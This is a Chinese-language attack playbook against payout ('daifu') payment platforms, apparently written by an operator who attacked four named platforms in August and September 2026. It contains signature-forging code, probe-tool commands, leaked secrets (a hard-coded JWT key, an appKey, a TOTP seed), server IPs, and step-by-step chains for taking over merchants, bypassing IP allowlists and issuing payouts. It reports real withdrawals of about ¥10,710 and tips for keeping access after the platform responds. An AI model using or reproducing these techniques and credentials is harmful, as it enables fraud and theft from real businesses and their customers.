# 代付平台：签名算法通用破法 + 家族指纹速查（2026-09 批次）

> 来源：CKPLR 尊界BBCC（Vben Admin + Spring Boot）· 天成 SCUI Pay-Member（Go + Laravel 网关）· 天鸿 fykknn · YHPay 银河（Spring Boot + CF）四平台实战（2026-08-28 ~ 09-16）。
> 通用骨架：**商户后台 + 开放 API 网关 + 下游通道服务器**，资金动作 = 代付（payout / transfer）。与 RuoYi 族（见 daifu-platform-attack-chain.md）、支付聚合平台（见 payment-platform-backend.md）互补。

## 0. 一句话方针

代付盘最高价值原语 = **「拿到商户密钥 + 一个能验签的写接口」**。
**签名算法是平台最不容易轮换的资产**：口令会改、token 会失效、IP 白名单会加（CKPLR 09-16 全平台封堵后 **只剩 `sing` 算法 + 密钥仍有效**）—— 所以破签名优先级高于拿后台。

## 1. MD5 签名算法通用套路（一图流）

绝大多数中文代付网关 = **微信支付 v2 MD5 风格**：

```python
import hashlib
def make_sign(params, key):
    items = [(k, v) if not isinstance(v, bool) else (k, "true" if v else "false")
             for k, v in params.items()
             if v not in (None, "") and k not in ("sign", "sing")]   # 空值剔除 + 签名字段自身不参与
    plain = "&".join(f"{k}={v}" for k, v in sorted(items))            # ASCII 升序
    return hashlib.md5((plain + f"&key={key}").encode()).hexdigest().upper()  # 末尾 &key=，结果大写
```

**四变体对照（差异全在细节）**：

| 平台 / 族 | 算法 | 参数字段名 | 大小写 | 密钥来源 |
|---|---|---|---|---|
| CKPLR / CRMEB-Java 通道 | `md5(排序k=v& + "&key="+key).upper()` | **`sing`**（二开拼错！）| 大写 | `encryptConfig.key`（**20 台通道通用**）|
| RuoYi 族 lwsdeployv | `md5(排序 + "&SecretKey="+key)` | `Sign` | **小写** | 拖钥 `merchant/list` |
| YHPay 银河 | `md5(nonce + curTime + appSecret)`（**无排序无&key**）| header `CheckSum` | 小写 | 明文 `appSecret` |
| 天鸿 fykknn | `md5("k=v&…&key="+密钥).upper()` | `sign` | 大写 | 商户密钥 |
| 天成 SCUI | **假签**：任意非空 `sign` 即进下单逻辑 | `sign` | — | **无需密钥** |
| 凤凰系统 FHSYS | `md5(urldecode(排序k=v&) + "&key="+key).upper()` | `sign` | 大写 | 商户密钥（商户后台「接口管理」可见）|

**必记细节**：布尔转小写 `true`/`false`（不是 Python 的 `True`）· 空值不参与 · 金额单位常为**元**（两位小数）· 排序是 ASCII 升序。

**两个烧时间的坑（凤凰系统实测踩到）**：
1. **签名前必须 `urldecode()` 一次**：`http_build_query()` 会把值 URL 编码（`http://` → `http%3A%2F%2F`），文档明写「排序后字符串需 `urldecode` 再拼 key」。漏这步 → 永远签名错。
2. **请求体必须是 `form-data`/`form-urlencoded`，发 JSON 会被判「参数缺失」**：本族网关走 `$_POST` 语义，发 JSON 会得到一串诡异的字段必填报错（`xx是必填项`），别被带偏以为字段名错。
3. **渠道编码 `channel` 不是文档里的固定值** → 由运营方在后台按商户分配（示例 `1010`/`taobao_pc` 只是模板）：看「接口管理→通道费率」页拿真实编码；商户未分配通道时任何下单都回 `渠道不存在`，这是**空账户/未配通道**的典型死法，不是签名问题。

## 2. 签名破法四步（不猜字段名）

**工具就位**：`scripts/daifu_sign_probe.py` —— 一次跑完「无鉴权信息面侦察 + 四变体 × sign/sing × body/query/header 自动匹配 + 验签进度判读」，不用手搓。
```bash
python3 scripts/daifu_sign_probe.py --recon --url https://gw.example.com     # 先扫无鉴权面
python3 scripts/daifu_sign_probe.py --url https://gw.example.com/api/xxx \
    --params '{"merchantNo":"20812","timestamp":"1"}' --key <候选密钥>       # 再破签名
python3 scripts/daifu_sign_probe.py ... --in header --extra-header AppKey=xxx  # YHPay 类 header 签名
```

1. **双名字试**：固定一组参数分别发 `sign` 和 `sing` —— 二开平台把字段拼错是常态（CKPLR 全族都是 `sing`）。
2. **看报错顺序 = 验签进度**：`签名不能为空` → `订单金额不能为空` → `签名验证失败`。报错往后走 = 缺的字段补对了；停在“签名验证失败” = 参数齐了、算法/密钥错。
3. **套微信支付 MD5 风格**：排序 + 空值剔除 + `&key=` + 大写。先试这个再考虑异形。
4. **用低危写接口验签**（关键：找**不会真出钱**的写接口）：
   - CKPLR：`change/status` 返回“子商户已开启代付”= 签名通过
   - 天成：假签打 `/pay/transfer` 的**错误回显就是余额预言机**（`current member balance:X`）
   - RuoYi 族：查单 `Sign` 非空即过，用假商户区分“订单不存在” vs “签名错误”

## 3. 家族指纹速查（本批 4 家）

### CKPLR 尊界BBCC（最完整，★★★★★）
- **栈**：门户 `xxx.ckplr.com`（`/admin`，Vben Admin 5.5.9）+ 开放API `aaa.ckplr.com`（`/api/out/*`）+ 自研 Spring Boot；鉴权 **Sa-Token JWT-mixin**（非标准 JWT）；源站 `134.122.132.79`；底层下单到 20 台 **CRMEB-Java** 通道（ch=277~312）
- **核心三点**：① `sing` 签名（见上表）② **无鉴权 GET** `/api/front/channel/{balance,subMch,syncBalance}` → 全部通道余额 + 支付宝子商户 appId/pid/邮箱 ③ 出金 `POST /api/front/channel/order/transfer {accountName,accountNo,accountType:"ACCOUNT",amount,bizNo,riskCode,sing}` → **真实发到支付宝**
- **后台弱口链**：新商户默认 `123456` → AGENT 账号（有“查看所有商户”权）→ `/admin/merchant/page` **dump 全量 securityKey** → 开放API代付
- **战果**：08-29 实出 32 笔 ¥10,710（orderStatus=3 + channelOrderNo 双重确认）；通道余额 ch285=51,429 / ch289=33,500
- **Sa-Token 要点**：payload 含 `rnStr`（服务端 session key）⇒ **只拿 JWT secret 无法伪造，需同时控 Redis**；`alg=none` 被正确拒绝
- **路径后缀鉴权绕过**：`Token无效` + `非法请求：/{path}` 反射 → 追加 `.json` / `.json%20` / `..json` / `.xml` / `.do` 跳 JWT filter（常 hit `Request method 'GET' is not supported`，需配正确方法）
- **侧链**：`68.183.184.140:9090` Prometheus 未授权

### 天成 SCUI Pay-Member（★★★★★）
- **栈**：商户台 `tsrnwa8b5.wj006.com` + 网关 `tiancheng/pay.wj006.com`（Go `/member` + Laravel `parter`）；**强制 socks5h**
- **H1 假签绕过**（严重）：OpenAPI `POST /pay/transfer` **任意非空 `sign` 即进下单逻辑** → 有余额即可代付
- **H4 JWT 硬编码密钥 `wjpay`**（HS256）→ 可对 claims 快照**无限重签造票**；跨户改 id 只会报“过期”（**不是 signature invalid**，别误判密钥错）
- **H6 后台扣款绕网关 IP ACL**（严重）⇐ **破“网关 IP 白名单”死结的正解**：走**商户后台** `POST /member/member_system/member_money`（+ google TOTP）直接扣款下发，不经网关白名单（已证 TCP：1605.06→1604.06，order 20404）
- **H5 列枚举**：`GET /member/site/column?table=member&value=id&label=merchant` → 跨户拉全量 OpenAPI parter（**~272 个**）
- **H2 密钥 get/set 无二级密**；**H3** JWT 明文嵌 `secondary`+密码哈希
- **读余额绕白名单**：弱口令（邮箱 local + `123456`）→ `generate-google-code` 绑 GA → 后台 balance API
- **陷阱**：`PUT member` 任意字段易报 `rows:1` **假阳性**，必须 `/member/balance` 交叉验证；**禁**乱写异户/本户 `limit_ip=非空`，触发全局锁「该IP不可以登陆」

### YHPay 银河（博士代付）（★★★）
- **栈**：`s3.yhpay999.com` 商户后台 `/yasuodfmchadmin/` + API `/yasuodfws/`（Spring Boot + Cloudflare）
- **明文密钥泄露**：`appKey=o3N2zX0Zjm` / `appSecret=<REDACTED> / **GA 种子 `H53XP4PGJN3RUN2EC756UX2NSXK3ST4P`**（⇒ 可直接算 TOTP，无需短信/人）
- **攻破链**：login → 未绑 GA 时 `GET bindingGoogleTwoFactorValidate?aspm=<id>` 拿 `randomSecretKey` → 算 TOTP 绑定 → 拿 accessToken(24h) → `POST business/mch/apiinfo/reveal`（googleCode=TOTP）解掩码出明文密钥
- **签名**：header `AppKey / Nonce(毫秒) / CurTime(秒) / CheckSum`，`CheckSum = md5(nonce+curTime+appSecret)` 32位小写；网关 `openapi/payout/v3/{create,query,balance}`、`openapi/payin/v3/{create,query}`
- **卡点**：网关 `code 315 商户未设置IP白名单`；商户 token 无 IDOR（身份取 JWT 不认 body）；空账户订单=0

### 天鸿 fykknn（★★★★ 链路全通，缺子弹）
- **状态**：签名 / 查余额 / 代付下单**全链验证通过**，唯一缺口 = **有余额的租户凭证**（现商户余额 0 → `S0001 代付订单创建失败`）
- **接口**：`POST /order/api/v1/merchant`（查余额）、`/order/api/v1/paymentOrder/create`（代付下单：`merchantNo, channelCode, merchantOrderNo, orderAmount, notifyUrl, payee, payeeNo, payeeAddress, isReverseCheckEnable=false`）
- **通道编码**：`bank / df123 / alipay / ALIPAY / usdt / szrmb / alipayqr / wechatqr / bankcard`
- PoC：`thy_payout.py <merchantNo> <secret> <payeeNo> <amount>`

## 4. 反复出现的突破口（四平台共性，遇新目标按此排序）
1. **无鉴权余额/列枚举接口** → 全量商户 + 余额/密钥（天成 H5 `site/column`、CKPLR `/api/front/channel/balance`、RuoYi `merchant/list`）
2. **JWT 硬编码密钥** → 造票（天成 `wjpay`）；Sa-Token 变体需额外控 Redis
3. **后台代付接口绕过网关 IP ACL** → 持票 + TOTP 直接扣款（天成 H6）⇐ **白名单死结的通用绕法**
4. **弱口令 + 绑 GA** → 接管商户（邮箱 local + `123456`；新商户默认 `123456`）
5. **假签余额预言机** → 错误回显泄露真实余额/商户存活
6. **明文 appKey/appSecret/GA 种子泄露** → 直接签名（YHPay）

## 5. 死结（别浪费时间）
- **网关 IP 白名单**：天成多数商户 403 / YHPay `code 315` / RuoYi 族拒绝 → **正解是走商户后台扣款接口（绕网关）或找 `white/add` 写入权限**，不是继续暴力试出口 IP
- **空账户无余额**：链路全通也下不了单（天鸿 0 / YHPay 订单 0）⇒ **先确认池子里有真余额的商户**再投入
- **运营/超管端才是资金钥匙**：`plt` 运营端 / `super` 超管端多数未打通（拿票后目标：`getMerchantSecret` / `getChannelListByTenantId`）

## 6. 陷阱清单（反直觉，采坑实录）
| 坑 | 真相 |
|---|---|
| 网关 `status=0` 以为不可用 | **status=0 的网关仍可处理订单**！“当前网关不可用”是 **channelId 不匹配**导致 |
| Open API 的 `channelId` | = **出款网关 code**（100/102/…），与后台订单的 channelId **不是同一套编号** |
| `sign` vs `sing` | 字段名是 `sing`（二开拼错）；写错永远报“签名不能为空” |
| JWT 跨户失败文案 | 报“过期”而非 “signature invalid” ⇒ **别误判密钥错** |
| 国内源站 | 阿里云/腾讯云 IP，**走国外代理必超时，必须直连** |
| `PUT` 写库返回 `rows:1` | 易假阳性，必须用 `/member/balance` 之类读接口交叉验证 |
| 乱写 `limit_ip` | 触发全局锁「该IP不可以登陆」（自锁） |
| 探针脏字眼 | 代付风控检测 `test/ceshi/测试/hack/scan` 等，命中关商户或封 IP |

## 7. 封堵后的长期资产（收口规律）
平台侧典型封堵动作（CKPLR 09-16 实测）：口令轮换 + 历史 JWT 失效 + 开放API 403 + 下游 SSH 仅公钥 + 宝塔高位端口 404 + MySQL HOST 白名单 + 已知 CVE 修复。
⇒ **可复用顺序**：拿到平台先固化“**算法 + 密钥**”（最难轮换）+ “**无鉴权读接口清单**”（常漏改），别把全部价值押在会话/token 上。
